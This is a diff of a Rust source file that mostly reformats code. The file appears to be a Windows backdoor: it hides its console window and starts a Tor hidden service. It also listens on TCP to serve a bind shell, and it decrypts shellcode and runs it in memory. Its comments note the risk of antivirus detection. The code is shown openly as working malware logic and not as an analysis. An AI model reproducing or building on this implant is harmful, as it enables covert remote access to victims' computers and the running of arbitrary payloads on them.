@@ -1,19 +1,19 @@
 #![windows_subsystem = "windows"]
 
-mod setting;
 mod config;
+mod setting;
 
-use std::{io, error, thread, mem, ptr};
 use std::fs::File;
-use std::path::{PathBuf};
-use std::process::{Command, Stdio, Child};
 use std::net::{TcpListener, TcpStream};
+use std::path::PathBuf;
+use std::process::{Child, Command, Stdio};
+use std::{error, io, mem, ptr, thread};
 
 use memmap::MmapMut;
 
 fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = setting::Setting::new()?;
-    
+
     start_tcp_server(&setting)?;
 
     Ok(())
@@ -22,29 +22,23 @@ fn main() -> Result<(), Box<dyn error::Error>> {
 fn unbundle_torrc(
     path: &PathBuf,
     port: u16,
-    setting: &setting::Setting
+    setting: &setting::Setting,
 ) -> Result<(), Box<dyn error::Error>> {
     let mut contents = setting.torrc.clone();
 
-    contents = contents.replace(
-        "@{DATA_DIR}",
-        setting.tor_dir.to_str().unwrap()
-    );
+    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());
 
     contents = contents.replace(
         "@{CTRL_COOKIE}",
-        setting.tor_dir.join("ctrl.cookie").to_str().unwrap()
+        setting.tor_dir.join("ctrl.cookie").to_str().unwrap(),
     );
 
     contents = contents.replace(
         "@{CTRL_SOCKET}",
-        setting.tor_dir.join("ctrl.socket").to_str().unwrap()
+        setting.tor_dir.join("ctrl.socket").to_str().unwrap(),
     );
 
-    contents = contents.replace(
-        "@{SERVICE_ADDR}",
-        &format!("127.0.0.1:{}", port)
-    );
+    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));
 
     std::fs::write(&path, &contents)?;
 
@@ -53,7 +47,7 @@ fn unbundle_torrc(
 
 fn start_tor_binary(
     torrc: &PathBuf,
-    setting: &setting::Setting
+    setting: &setting::Setting,
 ) -> Result<Child, Box<dyn error::Error>> {
     let mut executable = setting.tor_dir.join(&setting.name);
 
@@ -70,9 +64,7 @@ fn start_tor_binary(
             .status()?;
 
         if !status.success() {
-            return Result::Err(
-                String::from("problem setting app directory permision").into()
-            );
+            return Result::Err(String::from("problem setting app directory permision").into());
         }
     }
 
@@ -108,28 +100,28 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
                     // decrypt payload. now the shellcode goes to memory
                     // and may get detected by AV by now
                     let payload = setting::get_payload(&setting)?;
-            
+
                     // tor hidden service will be our shellcode later,
                     // so it need to be restarted
                     tor_proc.kill()?;
-            
+
                     // set hidden service port as payload port
                     unbundle_torrc(&torrc, payload.lport, &setting)?;
-            
+
                     // restart tor
                     tor_proc = start_tor_binary(&torrc, &setting)?;
-            
+
                     execute_payload(payload.data)?;
 
                     break;
                 } else {
                     match bind_shell(stream) {
-                        Ok(()) => {},
-                        Err(error) => println!("connection error: {:?}", error)
+                        Ok(()) => {}
+                        Err(error) => println!("connection error: {:?}", error),
                     };
                 }
-            },
-            Err(error) => return Err(Box::new(error))
+            }
+            Err(error) => return Err(Box::new(error)),
         }
     }
 
@@ -139,15 +131,16 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
 }
 
 fn pipe_thread<R, W>(mut r: R, mut w: W) -> thread::JoinHandle<()>
-where R: io::Read + Send + 'static,
-      W: io::Write + Send + 'static
+where
+    R: io::Read + Send + 'static,
+    W: io::Write + Send + 'static,
 {
     thread::spawn(move || {
         let mut buffer = [0; 1024];
         loop {
             let len = match r.read(&mut buffer) {
                 Ok(len) => len,
-                Err(_) => break
+                Err(_) => break,
             };
 
             if len == 0 {
@@ -155,13 +148,13 @@ where R: io::Read + Send + 'static,
             }
 
             match w.write(&buffer[..len]) {
-                Ok(_) => {},
-                Err(_) => break
+                Ok(_) => {}
+                Err(_) => break,
             };
 
             match w.flush() {
-                Ok(_) => {},
-                Err(_) => break
+                Ok(_) => {}
+                Err(_) => break,
             };
         }
     })
